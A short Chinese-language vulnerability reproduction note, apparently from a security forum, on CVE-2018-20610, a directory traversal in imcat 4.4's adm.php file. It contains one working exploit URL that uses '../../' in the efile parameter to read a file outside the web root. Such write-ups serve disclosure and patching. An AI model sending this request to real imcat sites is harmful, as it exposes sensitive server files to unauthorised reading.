# （CVE-2018-20610）Imcat 4.4 敏感信息泄露

> 原文：[https://www.zhihuifly.com/t/topic/2975](https://www.zhihuifly.com/t/topic/2975)

# （CVE-2018-20610）Imcat 4.4 敏感信息泄露

## 一、漏洞简介

imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中的root/run/adm.php文件存在目录遍历漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。

## 二、漏洞影响

imcat 4.4

## 三、复现过程

先在D盘创建1.txt

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

```
http://www.0-sec.org/root/run/adm.php?admin-ediy&part=edit&dkey=runs&dsub=&efile=../../1.txt&dialog=1546054963116&lang=cn 
```

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

## 参考链接

> https://github.com/AvaterXXX/CVEs/blob/master/imcat.md